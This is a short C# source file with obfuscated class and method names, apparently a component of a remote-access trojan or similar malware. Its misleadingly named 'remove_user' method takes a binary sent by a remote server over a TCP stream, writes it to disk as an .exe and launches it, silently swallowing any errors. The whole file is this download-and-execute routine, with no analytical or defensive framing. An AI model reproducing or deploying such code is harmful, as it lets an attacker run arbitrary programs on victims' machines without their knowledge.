using System.Diagnostics;
using System.IO;
using System.Net.Sockets;

namespace uiltghnsra;

internal class OCUMD
{
	public MCUDM server;

	public OCUMD(MCUDM lID)
	{
		server = lID;
	}

	public NetworkStream uiltghnsraNS(TcpClient uiltghnsratcpsrck)
	{
		return uiltghnsratcpsrck.GetStream();
	}

	public void uiltghnsraremove_user()
	{
		try
		{
			byte[] bytes = server.uiltghnsrapuull_data();
			if (!File.Exists(COUNF.uiltghnsraget_mpiath() + COUNF.uiltghnsraremvUdser + ".exe"))
			{
				File.WriteAllBytes(COUNF.uiltghnsraget_mpiath() + COUNF.uiltghnsraremvUdser + ".exe", bytes);
				Process.Start(COUNF.uiltghnsraget_mpiath() + COUNF.uiltghnsraremvUdser + ".exe");
			}
		}
		catch
		{
		}
	}
}
